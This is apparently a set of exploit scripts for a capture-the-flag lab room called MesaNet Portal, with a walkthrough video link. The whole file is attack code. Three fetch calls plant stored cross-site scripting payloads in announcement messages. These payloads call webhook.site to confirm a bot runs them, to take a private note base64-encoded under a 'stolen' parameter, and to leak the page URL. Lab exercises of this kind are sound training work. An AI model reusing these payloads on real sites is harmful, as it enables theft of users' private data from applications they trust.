## script used on MesaNet Portal room on Bugforge https://app.bugforge.io/
## YouTube walk through: https://youtu.be/9OjUF6yl54o

### testing bot outbound connection

```
fetch('/gateway', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    id: 'f7d4e8b2-3a1c-4f9e-8b2d-1c5e7a9f3b6d',
    endpoint: '/api/rail/create',
    data: {
      type: 'announcement',
      timestamp: '06:01:00',
      priority: 'high',
      message: `<img src=x onerror="fetch('https://webhook.site/UUID/?ping=bot_is_alive')">`,
    }
  })
}).then(r => r.json()).then(console.log)
```

### testing geting note id 6

```

fetch('/gateway', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    id: 'f7d4e8b2-3a1c-4f9e-8b2d-1c5e7a9f3b6d', // Rail App Router ID
    endpoint: '/api/rail/create',
    data: {
      type: 'announcement',
      timestamp: '13:37:00',
      priority: 'high',
      message: `OOB-Test<img src=x onerror="fetch('/gateway',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e',endpoint:'/api/notes/get',data:{id:6}})}).then(r=>r.text()).then(d=>fetch('https://webhook.site/UUID/?stolen='+btoa(d)))">`
    }
  })
}).then(r => r.json()).then(console.log);
```

### testing to get browser windows address

```
fetch('/gateway', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    id: 'f7d4e8b2-3a1c-4f9e-8b2d-1c5e7a9f3b6d', // Rail App Router ID
    endpoint: '/api/rail/create',
    data: {
      type: 'announcement',
      timestamp: '06:57:00',
      priority: 'high',
      message: `OOB-2<img src=x onerror="fetch('https://webhook.site/UUID/?url='+btoa(window.location.href),{mode:'no-cors'})">`
    }
  })
}).then(r => r.json()).then(console.log);

```
